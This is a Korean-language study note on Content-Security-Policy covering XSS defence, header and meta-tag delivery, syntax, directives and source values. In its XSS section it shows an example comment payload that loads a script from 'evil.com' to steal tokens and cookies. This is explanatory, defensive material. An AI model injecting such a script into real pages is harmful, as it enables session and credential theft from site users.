# CSP
**CSP(Content-Security-Policy)란?** 서버가 브라우저에게 **이 페이지에서 불러와도 되는 출처 목록**을 알려주는 보안 규칙이다. 브라우저는 이 목록을 보고 목록에 없는 출처의 스크립트, 이미지, 요청 등을 **차단**한다.

## 왜 필요할까?
대표적인 예시로는 **XSS 방어**가 있다.

**XSS(Cross-Site Scripting)이란?** 공격자가 남의 사이트에 악성 스크립트를 심는 공격이다.

```html
<!-- 게시판 댓글에 공격자가 이걸 써놓으면 -->
<script src="https://evil.com/steal.js"></script>
```

이 댓글을 다른 사용자가 열면 `steal.js` 가 그 사용자의 브라우저에서 우리 사이트 권한으로 실행된다. 그러면 로그인 토큰이나 쿠키를 탈취당한다.

CSP가 `script-src 'self'` 로 설정되어 있으면 **evil.com은 명단에 없다**고 판단해서 실행을 막는다. 콘솔에는 아래와 같은 에러가 찍힌다.

```
Refused to load the script 'https://evil.com/steal.js' because it violates
the following Content Security Policy directive: "script-src 'self'".
```

그치만 CSP는 XSS를 원천 차단하는 것은 아니다. 입력값 검증과 출력 이스케이프가 1차 방어이고 CSP는 그게 뚫렸을 때 피해를 막는 2차 방어선이다. 이런 구조를 **심층 방어(Defense in Depth)** 라고 한다.

## 어떻게 보낼까?
**방법 1** : HTTP 응답 헤더

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net
```

**방법 2** : HTML `<meta>` 태그

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

근데 `meta` 태그는 일부 지시어(`frame-ancestors`, `report-uri`, `sandbox`)를 지원하지 않는다. 그래서 실무에서는 헤더 방식을 쓴다.

## CSP 헤더 문법

```
Content-Security-Policy: script-src 'self' https://cdn.com; img-src 'self' data:
                         └─지시어─┘ └───── 출처들 ─────┘   └지시어┘ └─출처들─┘
                         └──────────── 규칙 1 ───────────┘ └────── 규칙 2 ─────┘
```

- **지시어**: 무엇을 제어할지 (`script-src` = 자바스크립트)
- **출처**: 어디서 온 것을 허용할지 (`'self'` = 우리 도메인)
- 규칙끼리는 `;`로, 한 규칙 안의 출처끼리는 띄어쓰기로 구분한다.

## 주요 지시어
지시어 | 제어 대상
--- | ---
default-src | 아래 `-src` 지시어들을 따로 안 적었을 때 쓰는 기본값
script-src | 자바스크립트
style-src | CSS
img-src | 이미지
font-src | 웹폰트
connect-src | `fetch`, `XMLHttpRequest`, WebSocket 같은 요청 목적지
frame-src | 우리 페이지 안에 넣는 `<iframe>`의 출처
frame-ancestors | 우리 페이지를 iframe으로 넣을 수 있는 사이트
object-src | `<object>`, `<embed>`
base-uri | `<base>` 태그로 바꿀 수 있는 기준 URL
form-action | `<form>` 제출 목적지

(`frame-ancestors`, `base-uri`, `form-action`은 `default-src` 를 상속하지 않는다. `default-src 'self'` 만 적었다고 이것들까지 막히는 건 아니고 따로 적어줘야한다.)

## 주요 출처 값
값 | 의미
--- | ---
`'self'` | 현재 페이지와 같은 출처(프로토콜 + 도메인 + 포트)
`'none'` | 아무것도 허용 안 함
`https://cdn.example.com` | 특정 도메인
`*.example.com` | 서브도메인 전체
`https:` | HTTPS면 아무 데나
`'unsafe-inline'` | `<script>...</script>` 처럼 HTML 안에 직접 쓴 코드 허용
`'unsafe-eval'` | `eval()`, `new Function()` 허용
`'nonce-랜덤값'` | 그 nonce가 붙은 스크립트만 허용
`'sha256-해시값'` | 내용 해시가 일치하는 스크립트만 허용
`'strict-dynamic'` | 허용된 스크립트가 불러오는 스크립트도 신뢰

**작은따옴표는 반드시 붙여야한다.** self라고만 쓰면 self라는 이름의 도메인으로 해석된다.